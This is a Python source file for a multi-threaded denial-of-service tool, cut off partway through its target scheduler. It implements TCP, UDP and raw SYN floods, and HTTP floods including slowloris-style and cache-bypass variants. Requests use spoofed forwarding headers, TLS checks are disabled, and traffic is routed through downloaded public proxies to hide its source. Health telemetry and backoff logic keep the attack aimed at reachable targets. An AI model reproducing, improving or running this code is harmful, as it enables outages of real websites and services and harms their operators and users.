#!/usr/bin/env python3
"""
BaseTool
"""
from __future__ import annotations

import json
import logging
import os
import random
import re
import socket
import ssl
import sys
import errno
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple

from PyRoxy import Proxy, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from impacket.ImpactPacket import IP, TCP
from requests import Session, get
from yarl import URL


# ----------------------------------------------------------------------
# Display-only target redaction for logs
# ----------------------------------------------------------------------
_IPV4_LOG = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")


def mask_ipv4(ip: str) -> str:
    parts = ip.split(".")
    if len(parts) != 4:
        return "[masked]"
    return f"{parts[0]}.**.{parts[2]}.**"


def mask_host_or_ip(host: str) -> str:
    trimmed = host.strip()
    if not trimmed:
        return "[masked]"
    if _IPV4_LOG.match(trimmed):
        return mask_ipv4(trimmed)
    visible = min(2, max(1, len(trimmed) // 4))
    return f"{trimmed[:visible]}***"


def mask_target_label(label: str) -> str:
    if not label:
        return "[masked]"
    parts = label.split(None, 1)
    if len(parts) == 1:
        return mask_host_or_ip(parts[0])
    method, endpoint = parts[0].upper(), parts[1]
    if ":" in endpoint:
        host, port = endpoint.rsplit(":", 1)
        return f"{method} {mask_host_or_ip(host)}:{port}"
    return f"{method} {mask_host_or_ip(endpoint)}"


def mask_target_key(key: str) -> str:
    if ":" in key:
        host, port = key.rsplit(":", 1)
        return f"{mask_host_or_ip(host)}:{port}"
    return mask_host_or_ip(key)



# ----------------------------------------------------------------------
# Logging
# ----------------------------------------------------------------------
logging.basicConfig(format='[%(asctime)s] %(message)s', datefmt="%H:%M:%S", stream=sys.stdout)
logger = logging.getLogger("BaseTool")
logger.setLevel(logging.INFO)

# ----------------------------------------------------------------------
# Завантаження JSON
# ----------------------------------------------------------------------
def load_json_safe(filepath: Path) -> dict | list:
    raw = filepath.read_text(encoding="utf-8")
    clean = re.sub(r',\s*([}\]])', r'\1', raw)
    return json.loads(clean)

# ----------------------------------------------------------------------
# Утиліти
# ----------------------------------------------------------------------
class Tools:
    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        from math import log2, trunc
        MULTIPLES = ["B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            multiple = min(multiple, len(MULTIPLES) - 1)
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum([abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        return str(num)

    @staticmethod
    def sizeOfRequest(res) -> int:
        size = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{k}: {v}' for k, v in res.request.headers.items()))
        return size

# ----------------------------------------------------------------------
# Per-target health (connect attempt / success telemetry)
# ----------------------------------------------------------------------
ERROR_KIND_DNS = "dns"
ERROR_KIND_REFUSED = "refused_closed_port"
ERROR_KIND_TIMEOUT = "timeout_or_filtered"
ERROR_KIND_ROUTE = "route_unavailable"
ERROR_KIND_PROXY = "proxy_tunnel_failed"
ERROR_KIND_TLS_HTTP = "tls_or_http_error"
ERROR_KIND_UNKNOWN = "unknown"

HARD_COOLDOWN_KINDS = {
    ERROR_KIND_DNS,
    ERROR_KIND_REFUSED,
    ERROR_KIND_PROXY,
}


def classify_target_failure(exc: BaseException) -> Tuple[str, str]:
    name = type(exc).__name__
    if isinstance(exc, socket.gaierror):
        return ERROR_KIND_DNS, f"{name}: DNS resolution failed"
    if isinstance(exc, ConnectionRefusedError):
        return ERROR_KIND_REFUSED, f"{name}: host reachable but port refused"
    if isinstance(exc, socket.timeout):
        return ERROR_KIND_TIMEOUT, (
            f"{name}: TCP connect/send timed out; check VPN/proxy/firewall/routing"
        )
    if isinstance(exc, TimeoutError):
        return ERROR_KIND_TIMEOUT, (
            f"{name}: TCP connect/send timed out; check VPN/proxy/firewall/routing"
        )
    if isinstance(exc, OSError) and getattr(exc, "errno", None) in {errno.EHOSTUNREACH, errno.ENETUNREACH}:
        return ERROR_KIND_ROUTE, f"{name}: network route unavailable; check VPN/proxy/firewall"
    if name in ("ProxyConnectionError", "GeneralProxyError", "ProxyError"):
        return ERROR_KIND_PROXY, (
            f"{name}: proxy tunnel failed; refresh proxy list, try VPN, "
            "or wait for proxy cache to reload"
        )
    if isinstance(exc, ssl.SSLError):
        return ERROR_KIND_TLS_HTTP, f"{name}: TLS handshake failed"
    lowered = name.lower()
    if "ssl" in lowered or "certificate" in lowered:
        return ERROR_KIND_TLS_HTTP, f"{name}: TLS/HTTPS error"
    return ERROR_KIND_UNKNOWN, name


def format_target_failure(exc: BaseException) -> str:
    return classify_target_failure(exc)[1]


class TargetHealth:
    def __init__(self):
        self._lock = threading.Lock()
        self._entries: Dict[str, Dict[str, object]] = {}
        self._recovered_reported: Set[str] = set()

    def _blank_entry(self) -> Dict[str, object]:
        return {
            "attempts": 0,
            "successes": 0,
            "last_error": "",
            "last_error_kind": ERROR_KIND_UNKNOWN,
            "consecutive_failures": 0,
        }

    def _ensure_unlocked(self, key: str) -> None:
        if key not in self._entries:
            self._entries[key] = self._blank_entry()

    def ensure(self, key: str) -> None:
        with self._lock:
            self._ensure_unlocked(key)

    def record_attempt(self, key: str) -> None:
        with self._lock:
            self._ensure_unlocked(key)
            self._entries[key]["attempts"] = int(self._entries[key]["attempts"]) + 1

    def record_success(self, key: str) -> bool:
        with self._lock:
            self._ensure_unlocked(key)
            self._entries[key]["successes"] = int(self._entries[key]["successes"]) + 1
            self._entries[key]["consecutive_failures"] = 0
            self._entries[key]["last_error"] = ""
            self._entries[key]["last_error_kind"] = ERROR_KIND_UNKNOWN
            if int(self._entries[key]["successes"]) == 1 and key not in self._recovered_reported:
                self._recovered_reported.add(key)
                return True
            return False

    def record_failure(self, key: str, exc: BaseException) -> None:
        kind, message = classify_target_failure(exc)
        with self._lock:
            self._ensure_unlocked(key)
            self._entries[key]["last_error"] = message
            self._entries[key]["last_error_kind"] = kind
            self._entries[key]["consecutive_failures"] = (
                int(self._entries[key]["consecutive_failures"]) + 1
            )

    def snapshot(self) -> Dict[str, Dict[str, object]]:
        with self._lock:
            return {key: dict(val) for key, val in self._entries.items()}

# ----------------------------------------------------------------------
# Layer4 атаки
# ----------------------------------------------------------------------
class Layer4(threading.Thread):
    def __init__(self, target: Tuple[str, int], method: str = "TCP",
                 synevent: threading.Event = None,
                 target_key: str = None, stats_dict: dict = None, stats_lock: threading.Lock = None,
                 target_health: TargetHealth = None, burst_limit: Optional[int] = None):
        super().__init__(daemon=True)
        self._target = target
        self._method = method
        self._synevent = synevent
        self.target_key = target_key
        self.stats_dict = stats_dict
        self.stats_lock = stats_lock
        self.target_health = target_health
        self._burst_limit = burst_limit
        self.methods = {"UDP": self.UDP, "SYN": self.SYN, "TCP": self.TCP}

    def run(self):
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    def _update_stats(self, bytes_sent: int):
        if self.stats_dict is not None and self.target_key:
            with self.stats_lock:
                if self.target_key not in self.stats_dict:
                    self.stats_dict[self.target_key] = [0, 0]
                self.stats_dict[self.target_key][0] += 1
                self.stats_dict[self.target_key][1] += bytes_sent
        if self.target_health and self.target_key and self.target_health.record_success(self.target_key):
            logger.info("target %s recovered: traffic flowing", mask_target_key(self.target_key))

    def _record_attempt(self) -> None:
        if self.target_health and self.target_key:
            self.target_health.record_attempt(self.target_key)

    def _record_failure(self, exc: BaseException) -> None:
        if self.target_health and self.target_key:
            self.target_health.record_failure(self.target_key, exc)

    def TCP(self):
        self._record_attempt()
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(.9)
                s.connect(self._target)
                sends = 0
                while True:
                    data = random.randbytes(1024)
                    if s.send(data):
                        self._update_stats(len(data))
                        sends += 1
                        if self._burst_limit is not None and sends >= self._burst_limit:
                            break
                    else:
                        break
        except Exception as exc:
            self._record_failure(exc)

    def UDP(self):
        self._record_attempt()
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                sends = 0
                while True:
                    data = random.randbytes(1024)
                    if s.sendto(data, self._target):
                        self._update_stats(len(data))
                        sends += 1
                        if self._burst_limit is not None and sends >= self._burst_limit:
                            break
                    else:
                        break
        except Exception as exc:
            self._record_failure(exc)

    def SYN(self):
        self._record_attempt()
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sends = 0
                while True:
                    pkt = self._genrate_syn()
                    if s.sendto(pkt, self._target):
                        self._update_stats(len(pkt))
                        sends += 1
                        if self._burst_limit is not None and sends >= self._burst_limit:
                            break
                    else:
                        break
        except Exception as exc:
            self._record_failure(exc)

    def _genrate_syn(self):
        ip = IP()
        ip.set_ip_src(socket.gethostbyname(socket.gethostname()))
        ip.set_ip_dst(self._target[0])
        tcp = TCP()
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(random.randint(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        if name == "UDP": self.SENT_FLOOD = self.UDP
        elif name == "SYN": self.SENT_FLOOD = self.SYN

# ----------------------------------------------------------------------
# Layer7 атаки
# ----------------------------------------------------------------------
class HttpFlood(threading.Thread):
    _proxies: List[Proxy] = None
    _useragents: List[str]
    _referers: List[str]

    def __init__(self, thread_id: int, target: URL, host: str, method: str = "GET",
                 rpc: int = 1, synevent: threading.Event = None,
                 useragents: Set[str] = None, referers: Set[str] = None,
                 proxies: Set[Proxy] = None,
                 target_key: str = None, stats_dict: dict = None, stats_lock: threading.Lock = None,
                 target_health: TargetHealth = None):
        super().__init__(daemon=True)
        self._thread_id = thread_id
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (host, target.port or 80)
        self.target_key = target_key
        self.stats_dict = stats_dict
        self.stats_lock = stats_lock
        self.target_health = target_health
        self.methods = {
            "POST": self.POST,
            "STRESS": self.STRESS,
            "SLOW": self.SLOW,
            "GSB": self.GSB,
            "BYPASS": self.BYPASS,
        }

        if not referers:
            referers = [
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                "https://drive.google.com/viewerng/viewer?url=",
            ]
        self._referers = list(referers)
        if proxies:
            self._proxies = list(proxies)

        if not useragents:
            useragents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
            ]
        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        self._defaultpayload = f"{self._req_type} {target.raw_path_qs} HTTP/1.1\r\n"
        self._payload = (
            self._defaultpayload +
            'Accept-Encoding: gzip, deflate, br\r\n'
            'Accept-Language: en-US,en;q=0.9\r\n'
            'Cache-Control: max-age=0\r\n'
            'Connection: keep-alive\r\n'
            'Sec-Fetch-Dest: document\r\n'
            'Sec-Fetch-Mode: navigate\r\n'
            'Sec-Fetch-Site: none\r\n'
            'Sec-Fetch-User: ?1\r\n'
            'Pragma: no-cache\r\n'
            'Upgrade-Insecure-Requests: 1\r\n'
        )

    def _update_stats(self, bytes_sent: int):
        if self.stats_dict is not None and self.target_key:
            with self.stats_lock:
                if self.target_key not in self.stats_dict:
                    self.stats_dict[self.target_key] = [0, 0]
                self.stats_dict[self.target_key][0] += 1
                self.stats_dict[self.target_key][1] += bytes_sent
        if self.target_health and self.target_key and self.target_health.record_success(self.target_key):
            logger.info("target %s recovered: traffic flowing", mask_target_key(self.target_key))

    def _record_attempt(self) -> None:
        if self.target_health and self.target_key:
            self.target_health.record_attempt(self.target_key)

    def _record_failure(self, exc: BaseException) -> None:
        if self.target_health and self.target_key:
            self.target_health.record_failure(self.target_key, exc)

    def _run_http_flood(self, payload: bytes) -> None:
        self._record_attempt()
        sock = None
        try:
            sock = self.open_connection()
            for _ in range(self._rpc):
                if sock.send(payload):
                    self._update_stats(len(payload))
        except Exception as exc:
            self._record_failure(exc)
        finally:
            if sock is not None:
                with suppress(Exception):
                    sock.close()

    def select(self, name: str):
        self.SENT_FLOOD = self.GET
        if name in self.methods:
            self.SENT_FLOOD = self.methods[name]

    def run(self):
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof = ProxyTools.Random.rand_ipv4()
        return (f"X-Forwarded-Proto: Http\r\n"
                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
                f"Via: {spoof}\r\nClient-IP: {spoof}\r\n"
                f"X-Forwarded-For: {spoof}\r\nReal-IP: {spoof}\r\n")

    def generate_payload(self, other: str = None) -> bytes:
        return str.encode(self._payload +
                          f"Host: {self._target.authority}\r\n" +
                          self.randHeadercontent +
                          (other or "") + "\r\n")

    def open_connection(self, host=None):
        if self._proxies:
            sock = random.choice(self._proxies).open_socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(.9)
        sock.connect(host or self._raw_target)
        if self._target.scheme.lower() == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self._target.host,
                                   server_side=False, do_handshake_on_connect=True,
                                   suppress_ragged_eofs=True)
        return sock

    @property
    def randHeadercontent(self) -> str:
        ua = random.choice(self._useragents)
        ref = random.choice(self._referers) + self._target.human_repr()
        return f"User-Agent: {ua}\r\nReferer: {ref}\r\n" + self.SpoofIP

    @staticmethod
    def getMethodType(method: str) -> str:
        if method.upper() in {"GET", "SLOW", "GSB", "BYPASS"}:
            return "GET"
        elif method.upper() in {"POST", "STRESS"}:
            return "POST"
        return "GET"

    # ---------- Методи атак ----------
    def GET(self):
        self._run_http_flood(self.generate_payload())

    def POST(self):
        payload = self.generate_payload(
            f"Content-Length: 44\r\nX-Requested-With: XMLHttpRequest\r\n"
            f"Content-Type: application/json\r\n\r\n"
            f'{{"data": "{ProxyTools.Random.rand_str(32)}"}}'
        )[:-2]
        self._run_http_flood(payload)

    def STRESS(self):
        payload = self.generate_payload(
            f"Content-Length: 524\r\nX-Requested-With: XMLHttpRequest\r\n"
            f"Content-Type: application/json\r\n\r\n"
            f'{{"data": "{ProxyTools.Random.rand_str(512)}"}}'
        )[:-2]
        self._run_http_flood(payload)

    def BYPASS(self):
        pro = random.choice(self._proxies).asRequest() if self._proxies else None
        self._record_attempt()
        try:
            with Session() as s:
                for _ in range(self._rpc):
                    resp = s.get(self._target.human_repr(), proxies=pro) if pro else s.get(self._target.human_repr())
                    self._update_stats(Tools.sizeOfRequest(resp))
        except Exception as exc:
            self._record_failure(exc)

    def GSB(self):
        self._record_attempt()
        sock = None
        try:
            sock = self.open_connection()
            for _ in range(self._rpc):
                qs = f"{self._target.raw_path_qs}?qs={ProxyTools.Random.rand_str(6)}"
                payload = str.encode(f"{self._req_type} {qs} HTTP/1.1\r\n"
                                     f"Host: {self._target.authority}\r\n" +
                                     self.randHeadercontent + "\r\n")
                if sock.send(payload):
                    self._update_stats(len(payload))
        except Exception as exc:
            self._record_failure(exc)
        finally:
            if sock is not None:
                with suppress(Exception):
                    sock.close()

    def SLOW(self):
        self._record_attempt()
        payload = self.generate_payload()
        sock = None
        try:
            sock = self.open_connection()
            for _ in range(self._rpc):
                if sock.send(payload):
                    self._update_stats(len(payload))
            while sock.send(payload) and sock.recv(1):
                for _ in range(self._rpc):
                    keep = f"X-a: {ProxyTools.Random.rand_int(1, 5000)}\r\n".encode()
                    if sock.send(keep):
                        self._update_stats(len(keep))
                    time.sleep(self._rpc / 15)
                    break
        except Exception as exc:
            self._record_failure(exc)
        finally:
            if sock is not None:
                with suppress(Exception):
                    sock.close()

# ----------------------------------------------------------------------
# Проксі-менеджер
# ----------------------------------------------------------------------
class ProxyManager:
    BASE_DIR = Path(__file__).resolve().parent
    CACHE_DIR = BASE_DIR / "cache"
    CACHE_FILE = CACHE_DIR / "proxies.json"
    CACHE_MAX_AGE = 86400  # 24 години
    VERIFY_MAX_CANDIDATES = 2500
    VERIFY_MIN_WORKING = 64
    VERIFY_PER_PROXY_TIMEOUT = 2.5
    VERIFY_THREADS = 100
    VERIFY_DEADLINE_SEC = 120.0

    @staticmethod
    def _proxy_type_name(proxy: Proxy) -> str:
        ptype = getattr(proxy, "type", None)
        if ptype is None:
            return "http"
        name = getattr(ptype, "name", str(ptype))
        return str(name).lower()

    @staticmethod
    def _parse_cached_proxy(entry) -> Optional[Proxy]:
        if isinstance(entry, str):
            line = entry.strip()
            if not line:
                return None
            for ptype in (ProxyType.HTTP, ProxyType.SOCKS4, ProxyType.SOCKS5):
                parsed = ProxyUtiles.parseAllIPPort([line], ptype)
                if parsed:
                    return next(iter(parsed))
            return None
        if isinstance(entry, dict):
            host = entry.get("host")
            port = entry.get("port")
            if not host or port is None:
                return None
            ptype = ProxyType.stringToProxyType(str(entry.get("type", "http")))
            parsed = ProxyUtiles.parseAllIPPort([f"{host}:{port}"], ptype)
            if parsed:
                return next(iter(parsed))
        return None

    @staticmethod
    def _read_cache_entries(allow_stale: bool = False) -> Optional[List[Proxy]]:
        if not ProxyManager.CACHE_FILE.exists():
            return None
        try:
            data = load_json_safe(ProxyManager.CACHE_FILE)
            age = time.time() - data.get("timestamp", 0)
            if age >= ProxyManager.CACHE_MAX_AGE and not allow_stale:
                logger.info("Cache expired, reloading...")
                return None
            proxies: List[Proxy] = []
            for entry in data.get("proxies", []):
                parsed = ProxyManager._parse_cached_proxy(entry)
                if parsed:
                    proxies.append(parsed)
            if not proxies:
                return None
            if age >= ProxyManager.CACHE_MAX_AGE:
                logger.warning("Using expired proxy cache (%s proxies)", len(proxies))
            else:
                logger.info("Loaded %s proxies from cache", len(proxies))
            return proxies
        except Exception as e:
            logger.warning(f"Cache read error: {e}")
        return None

    @staticmethod
    def _save_cache(proxies: List[Proxy]):
        ProxyManager.CACHE_DIR.mkdir(parents=True, exist_ok=True)
        entries = [
            {
                "host": p.host,
                "port": p.port,
                "type": ProxyManager._proxy_type_name(p),
            }
            for p in proxies
        ]
        data = {"timestamp": time.time(), "proxies": entries, "version": 2}
        try:
            with open(ProxyManager.CACHE_FILE, 'w') as f:
                json.dump(data, f)
            logger.debug("Proxy cache saved.")
        except (OSError, IOError) as e:
            logger.warning(f"Could not save proxy cache: {e}")

    @staticmethod
    def _verify_proxies_bounded(
        candidates: List[Proxy],
        test_url: str,
        *,
        max_candidates: int = VERIFY_MAX_CANDIDATES,
        min_working: int = VERIFY_MIN_WORKING,
        per_proxy_timeout: float = VERIFY_PER_PROXY_TIMEOUT,
        threads: int = VERIFY_THREADS,
        deadline_sec: float = VERIFY_DEADLINE_SEC,
    ) -> List[Proxy]:
        if not candidates:
            return []

        pool = list(candidates)
        random.shuffle(pool)
        to_check = pool[:max_candidates]
        total = len(pool)
        if total > len(to_check):
            logger.info(
                "Checking up to %s of %s downloaded proxies (bounded verify, deadline %.0fs)...",
                len(to_check),
                total,
                deadline_sec,
            )
        else:
            logger.info(
                "Verifying %s proxies (bounded verify, deadline %.0fs)...",
                len(to_check),
                deadline_sec,
            )

        working: List[Proxy] = []
        deadline = time.monotonic() + deadline_sec
        thread_count = max(1, min(threads, len(to_check)))
        batch_size = max(thread_count, min(64, len(to_check)))
        cursor = 0

        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            while (
                cursor < len(to_check)
                and len(working) < min_working
                and time.monotonic() < deadline
            ):
                batch = to_check[cursor:cursor + batch_size]
                cursor += len(batch)
                futures = {
                    executor.submit(proxy.check, test_url, per_proxy_timeout): proxy
                    for proxy in batch
                }
                for future in as_completed(futures):
                    if time.monotonic() >= deadline:
                        break
                    proxy = futures[future]
                    try:
                        if future.result():
                            working.append(proxy)
                            if len(working) >= min_working:
                                logger.info(
                                    "Found %s working proxies (target %s); stopping early",
                                    len(working),
                                    min_working,
                                )
                                break
                    except Exception:
                        pass

                for future in futures:
                    if not future.done():
                        future.cancel()

            if time.monotonic() >= deadline and len(working) < min_working:
                logger.warning(
                    "Proxy verification deadline reached (%ss); using %s working proxies so far",
                    int(deadline_sec),
                    len(working),
                )

        return working

    @staticmethod
    def get_proxies(proxy_providers: list, check_url: str = None) -> Optional[List[Proxy]]:
        if not proxy_providers:
            return None

        cached = ProxyManager._read_cache_entries(allow_stale=False)
        if cached:
            return cached

        all_proxies = set()
        with ThreadPoolExecutor(max_workers=max(1, len(proxy_providers))) as executor:
            futures = {executor.submit(ProxyManager._download_one, p): p for p in proxy_providers}
            for future in as_completed(futures):
                try:
                    all_proxies.update(future.result())
                except Exception as e:
                    logger.error(f"Download error: {e}")

        if not all_proxies:
            logger.error("No proxies downloaded from providers.")
            stale = ProxyManager._read_cache_entries(allow_stale=True)
            if stale:
                logger.warning(
                    "Using stale proxy cache (%s proxies) after empty provider download",
                    len(stale),
                )
                return stale
            return None

        test_url = check_url or "http://httpbin.org/get"
        working = ProxyManager._verify_proxies_bounded(list(all_proxies), test_url)
        if working:
            logger.info("%s proxies ready.", len(working))
            ProxyManager._save_cache(working)
            return working

        stale = ProxyManager._read_cache_entries(allow_stale=True)
        if stale:
            logger.warning(
                "No working proxies from verification; using stale cache (%s proxies)",
                len(stale),
            )
            return stale

        logger.error(
            "No working proxies found; proxy pool exhausted. "
            "Provider lists may be dead or blocked on this network."
        )
        return None

    @staticmethod
    def _download_one(provider: dict) -> Set[Proxy]:
        proxy_type = ProxyType.stringToProxyType(str(provider.get("type", "http")))
        url = provider["url"]
        timeout = provider.get("timeout", 10)
        try:
            resp = get(url, timeout=timeout)
            proxies = set()
            for line in resp.text.splitlines():
                for p in ProxyUtiles.parseAllIPPort([line], proxy_type):
                    proxies.add(p)
            return proxies
        except Exception as e:
            logger.debug(f"Failed to download from {url}: {e}")
            return set()

# ----------------------------------------------------------------------
# Монітор таблиці
# ----------------------------------------------------------------------
def monitor_loop(stop_event: threading.Event, target_stats: dict, stats_lock: threading.Lock,
                 target_keys: List[str], table_height: int):
    prev_total_req = 0
    prev_total_bytes = 0
    data_lines = max(1, table_height - 4)

    while stop_event.is_set():
        with stats_lock:
            snapshot = {key: val.copy() for key, val in target_stats.items()}

        sorted_targets = sorted(snapshot.items(), key=lambda x: x[1][0], reverse=True)
        total_req = sum(val[0] for val in snapshot.values())
        total_bytes = sum(val[1] for val in snapshot.values())
        delta_req = total_req - prev_total_req
        delta_bytes = total_bytes - prev_total_bytes
        prev_total_req = total_req
        prev_total_bytes = total_bytes

        lines = []
        lines.append(f"PPS: {Tools.humanformat(delta_req)} | BPS: {Tools.humanbytes(delta_bytes)}")
        lines.append("-" * 57)
        lines.append(f"{'Target':<30} {'Requests':>10} {'Bytes':>15}")
        lines.append("-" * 57)
        for i in range(data_lines):
            if i < len(sorted_targets):
                tgt, (req, byt) = sorted_targets[i]
                display_tgt = mask_target_key(tgt)
                lines.append(f"{display_tgt:<30} {req:>10} {Tools.humanbytes(byt):>15}")
            else:
                lines.append("")

        sys.stdout.write("\033[s")
        for i in range(table_height):
            text = lines[i] if i < len(lines) else ""
            sys.stdout.write(f"\033[{i+1};1H\033[K{text}")
        sys.stdout.write("\033[u")
        sys.stdout.flush()
        time.sleep(1)

    sys.stdout.write("\033[s")
    for i in range(1, table_height + 1):
        sys.stdout.write(f"\033[{i};1H\033[K")
    sys.stdout.write("\033[u")
    sys.stdout.flush()

def health_watchdog_loop(stop_event: threading.Event, target_health: TargetHealth,
                         target_keys: List[str], proxy_mode: str = "direct"):
    last_warn: Dict[str, float] = {}
    last_aggregate_warn = 0.0
    while stop_event.is_set():
        snapshot = target_health.snapshot()
        now = time.time()
        total_attempts = 0
        total_successes = 0
        active_targets = 0
        for key in target_keys:
            entry = snapshot.get(key)
            if not entry:
                continue
            attempts = int(entry.get("attempts", 0))
            successes = int(entry.get("successes", 0))
            last_error = str(entry.get("last_error", "") or "")
            total_attempts += attempts
            total_successes += successes
            if attempts > 0:
                active_targets += 1
            if successes > 0:
                continue
            if attempts <= 0:
                continue
            if not last_error:
                continue
            interval = 5.0 if attempts < 20 else 30.0
            prev = last_warn.get(key, 0.0)
            if now - prev >= interval:
                message = (
                    f"target {mask_target_key(key)} unreachable: 0/{attempts} attempts "
                    f"(last: {last_error})"
                )
                logger.warning(message)
                print(message, file=sys.stderr, flush=True)
                last_warn[key] = now

        all_have_errors = active_targets > 0
        for key in target_keys:
            entry = snapshot.get(key)
            if not entry:
                continue
            attempts = int(entry.get("attempts", 0))
            if attempts <= 0:
                continue
            if not str(entry.get("last_error", "") or ""):
                all_have_errors = False
                break

        aggregate_interval = 10.0 if total_attempts < 50 else 30.0
        if (
            active_targets > 0
            and total_attempts > 0
            and total_successes == 0
            and all_have_errors
            and now - last_aggregate_warn >= aggregate_interval
        ):
            if proxy_mode == "direct":
                aggregate = (
                    "all targets unreachable; direct mode is active; "
                    "enable proxy or VPN, or check DNS/firewall"
                )
            else:
                aggregate = (
                    "all targets unreachable; proxy mode is active but no traffic is flowing; "
                    "proxy pool may be dead — refresh module, check providers, or try VPN"
                )
            logger.warning(aggregate)
            print(aggregate, file=sys.stderr, flush=True)
            last_aggregate_warn = now
        time.sleep(5)


def capacity_health_loop(
    stop_event: threading.Event,
    target_health: TargetHealth,
    target_keys: List[str],
    target_stats: dict,
    stats_lock: threading.Lock,
    scheduler: "TargetScheduler",
    worker_count: int,
    proxy_mode: str,
    interval_sec: float = 10.0,
):
    last_emit = 0.0
    while stop_event.is_set():
        now = time.time()
        if now - last_emit < interval_sec:
            time.sleep(1)
            continue
        last_emit = now

        snapshot = target_health.snapshot()
        with stats_lock:
            stats_snapshot = {key: val.copy() for key, val in target_stats.items()}

        pools = scheduler.summarize_pools(snapshot, now)
        useful_bytes = sum(int(val[1]) for val in stats_snapshot.values())
        wasted_attempts = 0
        for key in target_keys:
            entry = snapshot.get(key, {})
            attempts = int(entry.get("attempts", 0))
            successes = int(entry.get("successes", 0))
            wasted_attempts += max(0, attempts - successes)

        ready_count = scheduler.count_ready(snapshot, now)
        idle_workers = max(0, worker_count - min(worker_count, ready_count))
        diagnosis = scheduler.derive_diagnosis(
            pools,
            proxy_mode=proxy_mode,
            useful_bytes=useful_bytes,
            ready_count=ready_count,
        )

        payload = {
            "healthyTargets": pools["healthy"],
            "degradedTargets": pools["degraded"],
            "discoveryTargets": pools["discovery"],
            "closedTargets": pools["closed"],
            "cooldownTargets": pools["cooldown"],
            "activeWorkers": worker_count,
            "readyTargets": ready_count,
            "idleWorkers": idle_workers,
            "wastedAttempts": wasted_attempts,
            "usefulBytes": useful_bytes,
            "diagnosis": diagnosis,
            "proxyMode": proxy_mode,
        }
        line = f"BASETOOL_HEALTH {json.dumps(payload, separators=(',', ':'))}"
        logger.info(line)
        print(line, file=sys.stderr, flush=True)
        time.sleep(1)


# ----------------------------------------------------------------------
# Adaptive health-aware target scheduler
# Targets with past successes stay healthy only while consecutive failures
# remain below HEALTHY_DEMOTION_STREAK; demoted targets use the normal
# discovery/degraded/closed pools and may re-enter via recovery probes.
# ----------------------------------------------------------------------
MAX_WORKER_THREADS = 512
LAYER4_BURST_SENDS = 8
DISCOVERY_ATTEMPTS_PER_TARGET = 2


@dataclass
class TargetJob:
    method: str
    target_key: str
    layer4_addr: Optional[Tuple[str, int]] = None
    url: Optional[URL] = None
    host: Optional[str] = None
    rpc: int = 1
    proxies: Optional[Set[Proxy]] = None
    useragents: Set[str] = field(default_factory=set)
    referers: Set[str] = field(default_factory=set)


class TargetScheduler:
    BACKOFF_BASE_SEC = 2.0
    BACKOFF_MAX_SEC = 45.0
    BACKOFF_AFTER_ATTEMPTS = 3
    HARD_BACKOFF_BASE_SEC = 30.0
    HARD_BACKOFF_MAX_SEC = 120.0
    HARD_BACKOFF_AFTER_ATTEMPTS = 2
    HEALTHY_DEMOTION_STREAK = 2
    POOL_HEALTHY = 0
    POOL_DISCOVERY = 1
    POOL_DEGRADED = 2
    POOL_COOLDOWN_PROBE = 3

    def __init__(self, jobs: List[TargetJob], target_health: TargetHealth, worker_count: int = 1):
        self.jobs = jobs
        self.target_health = target_health
        self.worker_count = max(1, worker_count)
        self._lock = threading.Lock()
        self._backoff_until: Dict[str, float] = {}
        self._cursor = 0
        self._probe_cursor = 0
        self._pick_counter = 0

    def _pick_round_robin(self, group: List[TargetJob], probe: bool = False) -> TargetJob:
        if probe:
            job = group[self._probe_cursor % len(group)]
            self._probe_cursor += 1
            return job
        job = group[self._cursor % len(group)]
        self._cursor += 1
        return job

    def _failure_streak(self, key: str, snapshot: Dict[str, Dict[str, object]]) -> int:
        entry = snapshot.get(key, {})
        return int(entry.get("consecutive_failures", 0)) or max(
            0,
            int(entry.get("attempts", 0)) - int(entry.get("successes", 0)),
        )

    def _consecutive_failure_streak(
